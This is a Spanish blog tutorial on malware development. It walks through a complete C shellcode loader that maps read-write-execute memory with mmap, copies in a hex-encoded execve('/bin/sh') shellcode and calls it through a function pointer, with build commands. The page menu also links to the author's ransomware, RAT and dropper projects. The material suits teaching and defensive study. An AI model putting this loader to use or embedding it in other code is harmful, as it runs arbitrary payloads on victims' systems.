<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <title>Inyeccion de shellcodes usando la syscall mmap &#8211; c4rta</title> <meta name="description" content="Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()"> <meta name="keywords" content="MalDev"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="avatar.jpg"> <meta name="twitter:title" content="Inyeccion de shellcodes usando la syscall mmap"> <meta name="twitter:description" content="Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()"> <meta name="twitter:site" content="@_c4rta_"> <meta name="twitter:creator" content="@_c4rta_"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Inyeccion de shellcodes usando la syscall mmap"> <meta property="og:description" content="Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()"> <meta property="og:url" content="http://localhost:4000/inyeccion-shellcodes-mmap/"> <meta property="og:site_name" content="c4rta"> <meta property="og:image" content="http://localhost:4000/images/avatar.jpg"> <link rel="canonical" href="http://localhost:4000/inyeccion-shellcodes-mmap/"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Feed --> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="" /> <!-- Favicons --> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- CSS --> <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css"> <!-- Left Block Image for Posts --> <style type="text/css"> #posts.inner-post-page .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/assets/img/fondo6.jpg) no-repeat;background-size: cover;} </style> <!-- Left Block Images for Home and Pages --> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/assets/img/fondo2.gif) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/assets/img/fondo3.jpg) no-repeat;background-size: cover;} </style> </head> <body id="posts" class="inner-post-page"> <div class="block-left"> <div class="content"> <a href="http://localhost:4000" class="logo"><img src="http://localhost:4000/images/avatar.jpg"></a> <div class="post-title-section"> <div class="section-line">Posts <em>/</em></div> <h1 class="section-title">Inyeccion de shellcodes usando la syscall mmap </h1> <ul class="tags"> <li><a href="http://localhost:4000/tags#MalDev">MalDev</a></li> </ul> <div class="section-line reverse"><a href="http://localhost:4000/posts">Back to posts</a> <em>/</em></div> </div> </div> </div> <div class="block-right"> <div class="share-buttons"> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/inyeccion-shellcodes-mmap/" class="btn btn_twitter" title="Share on Twitter"><i class="fa fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/inyeccion-shellcodes-mmap/" class="btn btn_facebook" title="Share on Facebook"><i class="fa fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a> <a href="https://plus.google.com/share?url=http://localhost:4000/inyeccion-shellcodes-mmap/" class="btn btn_google-plus" title="Share on Google Plus"><i class="fa fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a> </div> <a href="../posts.html" title="posts" class="posts-menu-icon"></a> <a title="projects" class="projects-menu-icon"> <span></span> </a> <div class="inner-post content"> <div class="date-highlight">10 Jun 2023</div> <p class="lead">Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()</p> <h2 id="mmap">mmap</h2> <p>mmap es una syscall y una funcion incorporada en el header <code class="highlighter-rouge">sys/mman.h</code> la cual permite asignar o mapear memoria dentro del espacio de direcciones virtuales de un proceso, mmap regresa un puntero void (void *), la estructura es:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="n">mmap</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
</code></pre></div></div> <ul> <li> <p><strong>void *addr</strong>: Es la direccion desde donde se va a asignar la memoria, esta direccion se la podemos asignar manualmente, o en todo caso de que le pogamos <code class="highlighter-rouge">NULL</code>, le estamos diciendo al kernel que asigne la memoria, regularmente la asigna a direcciones cercanas pero mayores a <code class="highlighter-rouge">/proc/sys/vm/mmap_min_addr</code></p> </li> <li> <p><strong>size_t length</strong>: Es la longitud en bytes de la memoria que se va a asignar</p> </li> <li><strong>int prot</strong>: Se refiera a con que protecciones vamos a asignar la memoria, hay varias <ul> <li>PROT_EXEC: La memoria es ejecutable</li> <li>PROT_READ: La memoria tiene permisos de lectura</li> <li>PROT_WRIT: La memoria tiene permisos de escritura</li> </ul> </li> <li> <p><strong>int flags</strong>: Determina si las actualizaciones de la memoria, son visibles para otras asignaciones de memoria dentro de la misma region de la memoria, existe muchas flags, asi que puedes leer cada una de ellas <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">aqui</a>.</p> </li> <li> <p><strong>int fd</strong>: Es el descriptor de archivos el cual sera asginado</p> </li> <li><strong>off_t offset</strong>: Es el desplazamiento desde donde se va a asignar la memoria</li> </ul> <p>Una vez sabiendo eso ya podemos comenzar a tirar codigo</p> <h2 id="desarrollo-del-programa">Desarrollo del programa</h2> <p>Primero debemos de empezar a declarar nuestra shellcode como una cadena de caracteres de esta manera:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><span class="s">"</span><span class="p">;</span>
</code></pre></div></div> <p>La shellcode ejecutara un /bin/sh</p> <p>Dentro de una funcion, empezare a declarar todo el codigo de la inyeccion, primero debemos sacar el tamaño en bytes de la shellcode, ya que es uno de los argumentos que recibe <strong>mmap</strong></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">ejecutar_shellcode</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">tam_shellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>Observa que se le esta agregando un <code class="highlighter-rouge">- 1</code>, esto es para quitarle el byte nulo.</p> <p>Despues haremos el llamado a <code class="highlighter-rouge">mmap</code>:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">ejecutar_shellcode</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">tam_shellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span><span class="o">*</span> <span class="n">shellcode_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">tam_shellcode</span><span class="p">,</span>
        <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="mi">0</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>La direccion donde se va a asignar la memoria es <code class="highlighter-rouge">NULL</code> para que el kernel la elija, el tamaño de la memoria a asignar es el tamaño de la shellcode, en las flag le decimos que la memoria se asigne con permisos de lectura, escritura, y ejecucion, con el <code class="highlighter-rouge">-1</code> le estamos diciendo al descriptor de archivos que no se requiere un archivo ya existente y que solo asigne memoria, y te podras dar cuenta de algo, estamos usando la flag <code class="highlighter-rouge">MAP_ANONYMOUS + MAP_PRIVATE</code>, con esas flags le estamos indicando que la asignacion sera simplemente un bloque de memoria en ceros (por eso mismo el offset es 0), la cual estara lista de usar, ademas de ser privada, es decir, estara excluida de otras asignaciones de memoria dentro de la misma region de memoria</p> <p>Aqui dibuje un diagrama de la asgnacion de memoria con mmap tomando en cuenta el ejemplo</p> <p><img src="/assets/img/mmap_injection/mmap.jpeg" alt="" /></p> <p>Lo que se ve a la izquierda es la memoria virtual de un proceso (sin entrar tanto en detalle), te podras dar cuenta que la memoria de la shellcode se asigno dentro de una seccion que se llama <code class="highlighter-rouge">Memory Mapping</code>, en esta seccion se asigna memoria para las librerias compartidas y dinamicas, ademas de las asignaciones de <code class="highlighter-rouge">mmap</code>, pero ojo, para que una asignacion de <code class="highlighter-rouge">mmap</code> recida en esta seccion, debe de ir con la flag <code class="highlighter-rouge">MAP_ANONYMOUS</code>.</p> <p>Resumidamente el diagrama seria algo asi:</p> <ul> <li>Usamos <code class="highlighter-rouge">sizeof()</code> para obtener el tamaño de la shellcode y lo guardamos en <code class="highlighter-rouge">tam_shellcode</code></li> <li>Asignamos memoria con <code class="highlighter-rouge">mmap</code> donde el tamaño es lo que tiene <code class="highlighter-rouge">tam_shellcode</code> (22 bytes)</li> <li>Usamos <code class="highlighter-rouge">MAP_ANONYMOUS</code> para indicarle que la asignacion se haga dentro de la seccion <code class="highlighter-rouge">Memory Mapping</code>,</li> </ul> <p>una vez que asignamos memoria para la shellcode, debemos de copiar la shellcode en esa memoria, eso lo hacemos con <code class="highlighter-rouge">memcpy</code>, memcpy se usa para copiar cierta cantidad de bytes desde un origen a un destino.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">tam_shellcode</span><span class="p">);</span>
</code></pre></div></div> <p>En nuestro ejemplo le estamos diciendo que copie 22 bytes (tam_shellcode) del origen (shellcode), hacia la memoria que asignamos (shellcode_mem), y con esta operacion, nuestra shellcode ya estara escrita en la memoria que asigamos con mmap.</p> <p>Ahora debemos de invocar a la shellcode, para eso realizamos esto:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shellcode_ptr</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode_mem</span><span class="p">;</span>
<span class="n">shellcode_ptr</span><span class="p">();</span>
</code></pre></div></div> <p>Primero definimos <code class="highlighter-rouge">shellcode_ptr</code> como un puntero a una funcion, con el fin de asignar a <code class="highlighter-rouge">shellcode_ptr</code> la direccion de memora que contiene <code class="highlighter-rouge">shellcode_mem</code> ya que cabe recordar que <code class="highlighter-rouge">shellcode_mem</code> contiene la direccion de memoria desde donde se asigno la shellcode, que es un tipo void *</p> <p>Despues con <code class="highlighter-rouge">void (*)()</code> le estamos diciendo que defina un puntero a una funcion que no recibe argumentos ni tampoco retorne nada, esto con el fin de que <code class="highlighter-rouge">shellcode_mem</code> sea interpretado como un puntero hacia esa funcion, entonces a travez de <code class="highlighter-rouge">shellcode_ptr</code> podemos mandar a llamar a <code class="highlighter-rouge">shellcode_mem</code>.</p> <p>Asi que cuando se haga un llamado a <code class="highlighter-rouge">shellcode_ptr();</code>, ejecutara lo que esta almacenado en <code class="highlighter-rouge">shellcode_mem</code>, lo cual es la shellcode:D</p> <p>Despues solo queda a mandar a llamar a la funcion <code class="highlighter-rouge">ejecutar_shellcode()</code> desde el main:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">ejecutar_shellcode</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>Y el codigo completo queda asi:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><span class="s">"</span><span class="p">;</span> <span class="c1">//bin/sh
</span>
<span class="kt">void</span> <span class="n">ejecutar_shellcode</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">tam_shellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span><span class="o">*</span> <span class="n">shellcode_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">tam_shellcode</span><span class="p">,</span>
        <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="mi">0</span>
    <span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">tam_shellcode</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Tamaño de la shellcode: %zu bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tam_shellcode</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode asignada desde la direccion: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shellcode_mem</span><span class="p">);</span>

        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shellcode_ptr</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode_mem</span><span class="p">;</span>

        <span class="n">shellcode_ptr</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">ejecutar_shellcode</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>Solo queda compilar y ejectuar</p> <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -o inyeccion_mmap inyeccion_mmap.c
./inyeccion_mmap
</code></pre></div></div> <p>Eso ha sido todo, gracias por leer ❤</p> <p><img src="/assets/img/mmap_injection/waifu.gif" alt="" /></p> <br> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/inyeccion-shellcodes-mmap/" class="btn btn_twitter" title="Share on Twitter"><i class="fa fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/inyeccion-shellcodes-mmap/" class="btn btn_facebook" title="Share on Facebook"><i class="fa fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a> <a href="https://plus.google.com/share?url=http://localhost:4000/inyeccion-shellcodes-mmap/" class="btn btn_google-plus" title="Share on Google Plus"><i class="fa fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a> <nav class="pagination"> <a href="http://localhost:4000/maldev-shellcodes/" class="pagination_pager" title="Shellcodes - syscall write() y execve(bin/sh) ">previous</a> <a href="http://localhost:4000/htb-format/" class="pagination_pager" title="HackTheBox Format - LFI, Redis y Python format string ">next</a> </nav> </div> </div> <!-- JS --> <script src="http://localhost:4000/assets/js/main.min.js"></script> <div class="overlay"> <ul class="projects-menu"> <li style="background:url(https://www.drunkgaming.net/uploads/monthly_2023_07/ucmd1fimkara1.gif.dfdd0c0d3b5e1def01e9bc009ff1d853.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/NazunaRansom" target="_blank" rel="nofollow external"> <span> Nazuna Ransomware </span> </a> </li> <li style="background:url(https://i.pinimg.com/originals/0c/af/9f/0caf9f7b8ab4917287aaaf8b8b772cd7.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/Synergy-RAT" target="_blank" rel="nofollow external"> <span> Synergy RAT </span> </a> </li> <li style="background:url(https://media.tenor.com/XbbgjUJaLe0AAAAC/kumiko-oumae-nono.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/PEjector" target="_blank" rel="nofollow external"> <span> PEjector </span> </a> </li> <li style="background:url(https://media.tenor.com/c7fsPiG8UwIAAAAC/bocchi-the-rock-anime.gif) center center no-repeat;"> <a href="https://github.com/ic4rta/ISCAN" target="_blank" rel="nofollow external"> <span> ISCAN </span> </a> </li> <li style="background:url(https://cdn.donmai.us/sample/fb/33/__zima_arknights_drawn_by_hi_yuuga__sample-fb330c3380344c3466f6972451d7c8c9.jpg) center center no-repeat;"> <a href="https://github.com/ic4rta/ZimaDropper" target="_blank" rel="nofollow external"> <span> Zima Dropper </span> </a> </li> </ul> </div> </body> </html>
